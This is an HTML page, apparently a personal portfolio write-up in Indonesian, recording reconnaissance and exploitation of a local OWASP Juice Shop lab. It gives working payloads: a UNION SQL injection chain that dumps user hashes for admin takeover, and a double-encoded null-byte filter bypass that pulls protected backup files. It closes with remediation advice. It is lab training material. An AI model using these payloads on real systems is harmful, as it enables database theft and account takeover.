@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Pengkulitan Penuh (Recon → Eksploitasi) — Twist</title>
+<meta name="description" content="Pengkulitan Penuh (Recon → Eksploitasi) — Twist">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<header class="site"><div class="wrap">
+  <span class="brand">Twist<span class="dot">://</span>security</span>
+  <nav>
+    <a href="../index.html">Writeups</a>
+    <a href="../index.html#tentang">Tentang</a>
+  </nav>
+</div></header>
+<article><div class="wrap">
+<div class="crumbs"><a href="../index.html">writeups</a> / 002</div>
+<h1>Pengkulitan Penuh (Recon → Eksploitasi)</h1>
+<div class="meta-box">
+  <div><b>Target</b> Juice Shop</div>
+  <div><b>Kelas</b> Reconnaissance</div>
+  <div><b>Severity</b> <span class="badge" style="color:#8b9dff">MULTI</span> <small>cvss 1C·3H·3M·2L</small></div>
+  <div><b>Peneliti</b> Twist</div>
+</div>
+
+<p><strong>Target:</strong> OWASP Juice Shop v6.2.0-SNAPSHOT (instance lokal — lab latihan)
+<strong>Tanggal:</strong> 9 Oktober 2026
+<strong>Peneliti:</strong> Twist
+<strong>Ringkasan severity:</strong> 1 Critical · 3 High · 3 Medium · 2 Low</p>
+<hr />
+<h2 id="daftar-temuan">📋 DAFTAR TEMUAN</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Temuan</th>
+<th>Endpoint</th>
+<th>Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>SQL Injection → dump database penuh + admin takeover</td>
+<td><code>/rest/products/search?q=</code></td>
+<td><strong>CRITICAL</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Directory listing + 12 file sensitif kebocor</td>
+<td><code>/ftp</code></td>
+<td><strong>HIGH</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Bypass filter ekstensi (null byte)</td>
+<td><code>/ftp/*</code></td>
+<td><strong>HIGH</strong></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Broken Access Control — data user tanpa auth</td>
+<td><code>/rest/memories</code>, <code>/api/Feedbacks</code></td>
+<td><strong>HIGH</strong></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Bocor daftar lengkap 116 kerentanan + hint</td>
+<td><code>/api/Challenges</code></td>
+<td><strong>MEDIUM</strong></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Dependency disclosure (versi rentan)</td>
+<td><code>/ftp/package.json.bak</code></td>
+<td><strong>MEDIUM</strong></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Metrics internal terbuka</td>
+<td><code>/metrics</code></td>
+<td><strong>MEDIUM</strong></td>
+</tr>
+<tr>
+<td>8</td>
+<td>Header keamanan hilang + CORS permisif</td>
+<td>semua</td>
+<td><strong>LOW</strong></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Aturan deteksi SIEM bocor</td>
+<td><code>/ftp/suspicious_errors.yml</code></td>
+<td><strong>LOW</strong></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="1-sql-injection-kompromi-database-penuh-critical">1. SQL Injection → Kompromi Database Penuh  [CRITICAL]</h1>
+<p>Sudah dilaporkan detail di <code>001-juice-shop-sqli.md</code>.</p>
+<p><strong>Ringkas:</strong></p>
+<div class="codehilite"><pre><span></span><code>q=apple'         → error SQL
+q=a')) ORDER BY 9--   → valid  ⇒ 9 kolom
+q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--   → data arbitrer
+q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--   → 20 tabel
+q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--   → 24 akun + hash
+</code></pre></div>
+
+<p>→ <code>md5("admin123")</code> = hash admin → <strong>login admin berhasil</strong> → <code>/api/Users</code> 401 menjadi 200.</p>
+<hr />
+<h1 id="2-directory-listing-kebocoran-12-file-sensitif-high">2. Directory Listing + Kebocoran 12 File Sensitif  [HIGH]</h1>
+<h2 id="reproduksi">Reproduksi</h2>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/ftp</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:3000</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, <strong>directory listing terbuka</strong> (pakai modul <code>serve-index</code> Express)</p>
+<h2 id="file-yang-bocor">File yang bocor</h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Status</th>
+<th>Isi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>acquisitions.md</code></td>
+<td>✅ kebuka</td>
+<td><strong>Dokumen M&amp;A KONFIDENSIAL</strong> — <em>"This document is confidential! Do not distribute!"</em></td>
+</tr>
+<tr>
+<td><code>incident-support.kdbx</code></td>
+<td>✅ kebuka</td>
+<td><strong>DATABASE KEEPASS</strong> (3.246 byte) — berisi kredensial</td>
+</tr>
+<tr>
+<td><code>legal.md</code></td>
+<td>✅ kebuka</td>
+<td>dokumen legal</td>
+</tr>
+<tr>
+<td><code>announcement_encrypted.md</code></td>
+<td>✅ kebuka</td>
+<td>370 KB berkas terenkripsi</td>
+</tr>
+<tr>
+<td><code>coupons_2013.md.bak</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td>daftar kupon</td>
+</tr>
+<tr>
+<td><code>package-lock.json.bak</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td>771 KB, <strong>1.968 paket</strong></td>
+</tr>
+<tr>
+<td><code>package.json.bak</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td>versi + dependency</td>
+</tr>
+<tr>
+<td><code>encrypt.pyc</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td>script enkripsi terkompilasi</td>
+</tr>
+<tr>
+<td><code>suspicious_errors.yml</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td><strong>aturan deteksi SIEM</strong></td>
+</tr>
+<tr>
+<td><code>eastere.gg</code></td>
+<td>403 → <strong>tembus</strong></td>
+<td>easter egg</td>
+</tr>
+</tbody>
+</table>
+<h2 id="bukti-isi-acquisitionsmd">Bukti isi <code>acquisitions.md</code></h2>
+<div class="codehilite"><pre><span></span><code><span class="gh"># Planned Acquisitions</span>
+
+<span class="k">&gt; </span><span class="ge">This document is confidential! Do not distribute!</span>
+
+Our company plans to acquire several competitors within the next year.
+This will have a significant stock market impact as we will elaborate in
+detail in the following paragraph:
+</code></pre></div>
+
+<p>→ Kebocoran informasi M&amp;A = <strong>kerugian finansial langsung</strong> (pelanggaran aturan
+keterbukaan informasi pasar modal). Di perusahaan nyata ini severity Critical,
+bukan High.</p>
+<hr />
+<h1 id="3-bypass-filter-ekstensi-via-null-byte-high">3. Bypass Filter Ekstensi via Null Byte  [HIGH]</h1>
+<h2 id="filter-yang-dipasang">Filter yang dipasang</h2>
+<div class="codehilite"><pre><span></span><code><span class="err">GET /ftp/package.json.bak</span>
+<span class="err">→ 403 Forbidden</span>
+<span class="err">→ Error: "Only .md and .pdf files are allowed!"</span>
+</code></pre></div>
+
+<p>Server memblokir ekstensi selain <code>.md</code> dan <code>.pdf</code>.</p>
+<h2 id="bypass">Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Hasil</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>package.json.bak</code></td>
+<td>403 — diblok</td>
+</tr>
+<tr>
+<td><code>package.json.bak%00.md</code></td>
+<td>400 — ditolak</td>
+</tr>
+<tr>
+<td><strong><code>package.json.bak%2500.md</code></strong></td>
+<td><strong>200 ✅ TEMBUS</strong></td>
+</tr>
+<tr>
+<td><code>package.json.bak.md</code></td>
+<td>404</td>
+</tr>
+<tr>
+<td><code>../package.json.bak</code></td>
+<td>403</td>
+</tr>
+<tr>
+<td><code>%252e%252e%2fpackage.json.bak</code></td>
+<td>403</td>
+</tr>
+<tr>
+<td><code>PACKAGE.JSON.BAK.MD</code></td>
+<td>403</td>
+</tr>
+</tbody>
+</table>
+<h2 id="akar-masalah">Akar masalah</h2>
+<p>Filter memeriksa ekstensi di <strong>tahap pertama</strong> decoding, tapi path diteruskan
+ke filesystem dengan <strong>decoding kedua</strong>. <code>%2500</code> → decode pertama jadi <code>%00</code>
+(tampak seperti <code>.md</code> di mata filter) → decode kedua jadi <code>\x00</code> (null byte)
+→ filesystem memotong path di titik itu, membaca <code>package.json.bak</code>.</p>
+<h2 id="bukti-packagejsonbak-berhasil-ditarik">Bukti — <code>package.json.bak</code> berhasil ditarik</h2>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"juice-shop"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6.2.0-SNAPSHOT"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"An intentionally insecure JavaScript Web Application"</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="dampak-turunan">Dampak turunan</h2>
+<div class="codehilite"><pre><span></span><code>✅ coupons_2013.md.bak      142 byte
+✅ eastere.gg               337 byte
+✅ encrypt.pyc              573 byte   ← script enkripsi
+✅ package-lock.json.bak    771 KB     ← 1.968 paket
+✅ package.json.bak         4.440 byte
+✅ suspicious_errors.yml    741 byte
+</code></pre></div>
+
+<hr />
+<h1 id="4-broken-access-control-data-pengguna-tanpa-autentikasi-high">4. Broken Access Control — Data Pengguna Tanpa Autentikasi  [HIGH]</h1>
+<h2 id="4a-restmemories">4a. <code>/rest/memories</code></h2>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/memories</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, <strong>6.183 byte, 10 memori</strong> — tanpa token, tanpa login</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="s2">"success"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:[{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">13</span><span class="p">,</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"caption"</span><span class="p">:</span><span class="s2">"😼 #zatschi #whoneedsfourlegs"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"imagePath"</span><span class="p">:</span><span class="s2">"assets/public/images/uploads/..."</span><span class="p">}]}</span>
+</code></pre></div>
+
+<p>Foto pribadi pengguna + caption + <code>UserId</code>. <strong>Tidak butuh akun.</strong></p>
+<h2 id="4b-apifeedbacks">4b. <code>/api/Feedbacks</code></h2>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/Feedbacks</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, 8 feedback — termasuk <strong>alamat email di dalam komentar</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"I love this shop! ... (***in@juice-sh.op)"</span><span class="p">,</span><span class="nt">"rating"</span><span class="p">:</span><span class="mi">5</span><span class="p">}</span>
+<span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"Great shop! ... (***@juice-sh.op)"</span><span class="p">,</span><span class="nt">"rating"</span><span class="p">:</span><span class="mi">4</span><span class="p">}</span>
+<span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"Nothing useful available here! (***der@juice-sh.op)"</span><span class="p">}</span>
+</code></pre></div>
+
+<p>→ Email (walaupun terpotong) + <code>UserId</code> + rating. Kombinasi dengan temuan #1
+(SQLi) bikin masking-nya gak ada gunanya.</p>
+<hr />
+<h1 id="5-bocor-daftar-lengkap-kerentanan-medium">5. Bocor Daftar Lengkap Kerentanan  [MEDIUM]</h1>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/Challenges</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, <strong>66.278 byte, 116 tantangan</strong> — tanpa autentikasi</p>
+<div class="codehilite"><pre><span></span><code>Kategori yang kebuka:
+  17  Sensitive Data Exposure
+  14  Injection
+  12  Improper Input Validation
+  12  Broken Access Control
+   9  XSS
+   9  Vulnerable Components
+   9  Broken Authentication
+   5  Security Misconfiguration
+   5  Cryptographic Issues
+   4  Observability Failures
+   4  Broken Anti Automation
+   3  Security through Obscurity
+   3  Insecure Deserialization
+   2  Unvalidated Redirects
+   2  XXE
+</code></pre></div>
+
+<p>→ Ini peta jalan lengkap buat penyerang: tahu persis jenis kerentanan apa saja
+yang ada, plus deskripsi + hint-nya. Menghemat waktu recon berjam-jam.</p>
+<p><strong>Catatan:</strong> di Juice Shop ini memang sengaja. Di aplikasi produksi, endpoint
+yang membocorkan daftar kontrol keamanan internal = temuan nyata.</p>
+<hr />
+<h1 id="6-dependency-disclosure-versi-rentan-medium">6. Dependency Disclosure — Versi Rentan  [MEDIUM]</h1>
+<p>Dari <code>/ftp/package.json.bak</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6.2.0-SNAPSHOT"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"engines"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"node"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&gt;=6 &lt;=9"</span><span class="w"> </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">"express"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~4.16"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"sequelize"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~4"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"jsonwebtoken"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~8"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"sqlite3"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~3.1.13"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"sanitize-html"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.4.2"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"helmet"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~3.9"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"..."</span><span class="p">:</span><span class="w"> </span><span class="s2">"39 paket total"</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>Yang perlu diperiksa:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Paket</th>
+<th>Versi</th>
+<th>Kenapa penting</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sanitize-html</code></td>
+<td><strong>1.4.2</strong> (dipin exact)</td>
+<td>Versi sangat tua — banyak bypass sanitasi XSS ditemukan setelahnya</td>
+</tr>
+<tr>
+<td><code>jsonwebtoken</code></td>
+<td>~8</td>
+<td>Versi mayor lama, algoritma verifikasi lebih lemah</td>
+</tr>
+<tr>
+<td>Node</td>
+<td><strong>&gt;=6 &lt;=9</strong></td>
+<td>End-of-life bertahun-tahun, banyak CVE tidak dipatch</td>
+</tr>
+<tr>
+<td><code>helmet</code></td>
+<td>~3.9</td>
+<td>Versi lama, header default berbeda</td>
+</tr>
+</tbody>
+</table>
+<p>→ Dengan <code>package-lock.json.bak</code> (1.968 paket), penyerang bisa petakan
+seluruh rantai dependency dan cari CVE yang cocok. Tidak perlu menebak.</p>
+<hr />
+<h1 id="7-metrics-internal-terbuka-medium">7. Metrics Internal Terbuka  [MEDIUM]</h1>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/metrics</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, 379 baris Prometheus — tanpa autentikasi</p>
+<div class="codehilite"><pre><span></span><code>juiceshop_llm_input_tokens_total       Number of total input tokens processed
+juiceshop_llm_output_tokens_total      Number of output tokens processed
+juiceshop_llm_tool_calls_total         Number of tool calls made
+file_uploads_count                     Successful file uploads by file type
+file_upload_errors                     Failed file uploads by file type
+http_requests_count                    HTTP requests grouped by status code
+process_cpu_user_seconds_total         CPU time spent
+</code></pre></div>
+
+<p>→ Bocoran: penggunaan LLM internal (biaya token), pola upload file,
+statistik permintaan HTTP, pemakaian sumber daya. Berguna buat penyerang
+memetakan perilaku aplikasi + beban server.</p>
+<hr />
+<h1 id="8-header-keamanan-hilang-cors-permisif-low">8. Header Keamanan Hilang + CORS Permisif  [LOW]</h1>
+<div class="codehilite"><pre><span></span><code>Header yang ADA:
+  ✅ X-Content-Type-Options: nosniff
+  ✅ X-Frame-Options: SAMEORIGIN
+
+Header yang HILANG:
+  ❌ Content-Security-Policy        → tidak ada pertahanan XSS berlapis
+  ❌ Strict-Transport-Security      → tidak ada paksa HTTPS
+  ❌ Referrer-Policy
+  ❌ Permissions-Policy
+
+Yang terlalu permisif:
+  ⚠️  Access-Control-Allow-Origin: *
+</code></pre></div>
+
+<p><code>X-Frame-Options: SAMEORIGIN</code> ada, tapi tanpa CSP <code>frame-ancestors</code> — kalau
+CSP ditambahkan nanti, keduanya harus konsisten.</p>
+<hr />
+<h1 id="9-aturan-deteksi-siem-bocor-low">9. Aturan Deteksi SIEM Bocor  [LOW]</h1>
+<p>Dari <code>/ftp/suspicious_errors.yml</code> (setelah bypass):</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Suspicious error messages specific to the application</span>
+<span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detects error messages that only occur from tampering with or attacking the application</span>
+<span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Bjoern Kimminich</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">category</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application</span>
+<span class="w">    </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">nodejs</span>
+<span class="w">    </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">errorhandler</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">keywords</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">'Blocked</span><span class="nv"> </span><span class="s">illegal</span><span class="nv"> </span><span class="s">activity'</span>
+</code></pre></div>
+
+<p>→ <strong>Kebocoran yang ironis:</strong> ini justru berkas konfigurasi deteksi serangan.
+Penyerang jadi tahu persis pesan error mana yang memicu alert, sehingga bisa
+menghindari deteksi.</p>
+<hr />
+<h1 id="pelajaran-dari-pengkulitan-ini">📝 PELAJARAN DARI PENGKULITAN INI</h1>
+<h2 id="yang-paling-berharga">Yang paling berharga</h2>
+<p><strong>1. <code>200 OK</code> ≠ file ada.</strong></p>
+<div class="codehilite"><pre><span></span><code>/.git/config     → 200, tapi isinya HTML SPA  ← FALSE POSITIVE
+/package.json    → 200, tapi HTML
+/Promotions.md   → 200, tapi HTML
+</code></pre></div>
+
+<p>Aplikasi SPA punya catch-all route → SEMUA path balikin 200. Wajib cek
+<code>Content-Type</code> dan isi respons. Kalau tidak, laporan penuh false positive.</p>
+<p><strong>2. Directory listing itu pintu masuk paling gampang.</strong>
+<code>/ftp</code> → 12 file sensitif. Satu request.</p>
+<p><strong>3. 403 itu bukan jalan buntu — itu undangan.</strong>
+Filter ekstensi ketemu → langsung coba 11 teknik bypass. Yang menang:
+double-encoded null byte.</p>
+<p><strong>4. Baca JS bundle — sumber endpoint terbaik.</strong>
+1,2 MB <code>main.js</code> → 27 endpoint REST + 15 API. Tanpa nebak URL.</p>
+<p><strong>5. Endpoint tanpa auth itu temuan, bukan kebetulan.</strong>
+<code>/rest/memories</code>, <code>/api/Feedbacks</code>, <code>/api/Challenges</code> — semua 200 tanpa token.</p>
+<p><strong>6. Dependency disclosure = lead CVE, bukan sekadar info.</strong>
+Versi spesifik + lockfile 1.968 paket = peta kerentanan siap pakai.</p>
+<h2 id="metodologi-yang-dipakai">Metodologi yang dipakai</h2>
+<div class="codehilite"><pre><span></span><code>1. FINGERPRINT     header, versi, teknologi
+2. ENUMERASI       baca JS bundle → dapat peta endpoint
+3. VERIFIKASI      cek content-type, buang false positive
+4. PROBE           cari endpoint 200 tanpa auth
+5. TEMBUS          serang filter/validasi yang ketemu
+6. BUKTIKAN        tunjukin dampak nyata, bukan cuma "ada kerentanan"
+7. DOKUMENTASI     request/response mentah + penjelasan
+</code></pre></div>
+
+<h2 id="yang-tidak-berhasil-jujur">Yang TIDAK berhasil (jujur)</h2>
+<div class="codehilite"><pre><span></span><code>✗ Dekripsi coupons_2013.md.bak
+  → bukan XOR/ADD sederhana. encrypt.pyc (Python 2.7) pakai ord/chr/pow.
+  → butuh analisis bytecode lebih dalam untuk membalik algoritmanya.
+
+✗ File .git, package.json, sitemap.xml di root
+  → semua false positive (catch-all SPA)
+</code></pre></div>
+
+<hr />
+<h1 id="saran-perbaikan">🔧 SARAN PERBAIKAN</h1>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Temuan</th>
+<th>Perbaikan</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>SQLi</td>
+<td>Query terparameterisasi. Lihat <code>001-juice-shop-sqli.md</code> §5</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Directory listing</td>
+<td>Matikan <code>serve-index</code>, sajikan hanya file yang diminta secara eksplisit</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Bypass null byte</td>
+<td>Normalisasi path <strong>SEKALI</strong> dengan benar, tolak <code>\x00</code> mentah, validasi setelah decode final</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Broken access control</td>
+<td>Wajibkan autentikasi + otorisasi. <code>/api/Feedbacks</code> jangan kirim email mentah</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Bocor challenges</td>
+<td>Pindah endpoint ke balik autentikasi admin</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Dependency</td>
+<td>Naikkan <code>sanitize-html</code>, <code>jsonwebtoken</code>, Node ke versi didukung. Audit lockfile</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Metrics</td>
+<td>Batasi <code>/metrics</code> ke jaringan internal, tambah autentikasi</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Header</td>
+<td>Tambah CSP, HSTS. Batasi CORS ke origin spesifik</td>
+</tr>
+<tr>
+<td>9</td>
+<td>SIEM rule</td>
+<td>Jangan simpan konfigurasi deteksi di direktori publik</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="lampiran-file-bukti">📁 LAMPIRAN — FILE BUKTI</h1>
+<div class="codehilite"><pre><span></span><code>C:\Users\user\security-lab\writeups\002-juice-shop-full-recon.md   ← dokumen ini
+C:\Users\user\security-lab\writeups\001-juice-shop-sqli.md         ← laporan SQLi detail
+
+Bukti mentah:
+  cache\scratch\loot\       → acquisitions.md, incident-support.kdbx, legal.md, announcement_encrypted.md
+  cache\scratch\loot2\      → coupons_2013.md.bak, encrypt.pyc, package-lock.json.bak,
+                              package.json.bak, suspicious_errors.yml, eastere.gg
+  cache\scratch\fb.json     → respons /api/Feedbacks
+  cache\scratch\mem.json    → respons /rest/memories
+  cache\scratch\ch.json     → respons /api/Challenges (116 tantangan)
+  cache\scratch\main.js     → JS bundle (1,2 MB)
+</code></pre></div>
+<div class="crumbs" style="margin-top:52px"><a href="../index.html">← balik ke daftar writeup</a></div>
+</div></article>
+<footer class="site"><div class="wrap">
+  <span>Portofolio keamanan — latihan lab legal (OWASP Juice Shop).</span>
+  <span class="mono">dibuat 2026-10-09</span>
+</div></footer>
+</body>
+</html>
